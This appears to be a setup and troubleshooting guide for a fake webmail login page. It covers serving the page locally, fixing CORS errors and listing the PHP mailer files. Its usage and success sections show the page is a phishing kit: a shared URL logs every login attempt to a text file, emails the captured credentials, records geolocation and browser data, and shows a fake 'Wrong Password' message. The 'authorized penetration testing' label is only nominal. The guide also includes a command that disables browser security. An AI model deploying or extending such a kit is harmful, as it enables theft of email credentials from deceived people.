# Webmail Login Form - Setup Guide

## 🚨 CORS Error Fix - Multiple Solutions

The CORS error occurs because browsers block requests from `file://` protocol to `http://` servers. Here are the solutions:

## ✅ Solution 1: Use Local PHP Server (RECOMMENDED)

### Step 1: Start PHP Development Server
```bash
# Navigate to your project directory
cd /workspace

# Start PHP server on port 8080
php -S localhost:8080
```

### Step 2: Access via Browser
Open your browser and go to:
```
http://localhost:8080/webmail_login.html
```

**NOT:** `file:///path/to/webmail_login.html` ❌

## ✅ Solution 2: Use Python HTTP Server

If PHP server doesn't work, try Python:

```bash
# Python 3
python -m http.server 8080

# Python 2 (if needed)
python -m SimpleHTTPServer 8080
```

Then access: `http://localhost:8080/webmail_login.html`

## ✅ Solution 3: Use Node.js HTTP Server

```bash
# Install http-server globally
npm install -g http-server

# Start server
http-server -p 8080 --cors

# Access: http://localhost:8080/webmail_login.html
```

## 🧪 Testing Steps

### 1. Test Server Setup
Open browser console (F12) and run:
```javascript
testServer()
```

### 2. Test PHP Connection
```javascript
testConnection()
```

### 3. Test Multiple URLs
```javascript
testWithDifferentUrls()
```

### 4. Test Email Extraction
```javascript
testEmailExtraction()
```

## 📁 Required Files

Make sure these files are in the same directory:
- ✅ `webmail_login.html`
- ✅ `postmailer.php`
- ✅ `PHPMailer.php`
- ✅ `SMTP.php`
- ✅ `Exception.php`
- ✅ `test_server.php` (for testing)

## 🔧 Troubleshooting

### If you still get CORS errors:

1. **Check browser console** for detailed error messages
2. **Verify you're using http://localhost:8080** not file://
3. **Try different browsers** (Chrome, Firefox, Safari)
4. **Disable browser security** (temporary testing only):
   ```bash
   # Chrome with disabled security (TESTING ONLY)
   google-chrome --disable-web-security --user-data-dir="/tmp/chrome_dev"
   ```

### Common Issues:

1. **Port already in use**: Try different port (8081, 8082, etc.)
2. **PHP not installed**: Install PHP or use Python server
3. **File permissions**: Make sure files are readable
4. **Firewall blocking**: Check firewall settings

## 🎯 Usage for Penetration Testing

Once working:
1. Share the URL: `http://your-server:8080/webmail_login.html`
2. All login attempts will be logged to `SS-Or.txt`
3. Email notifications sent to configured address
4. Geolocation and browser info captured

## 🔒 Security Notes

- This is for authorized penetration testing only
- Use in controlled, secured environments
- Ensure proper permissions before deployment
- Monitor and secure log files

## 📞 Quick Fix Commands

```bash
# Kill existing PHP server
pkill -f "php -S"

# Start fresh server
cd /workspace
php -S localhost:8080

# Check if server is running
curl http://localhost:8080/test_server.php
```

## 🚀 Success Indicators

When working correctly, you should see:
- ✅ No CORS errors in console
- ✅ Form submits successfully
- ✅ "Wrong Password" message appears
- ✅ Data logged to `SS-Or.txt`
- ✅ Email notifications sent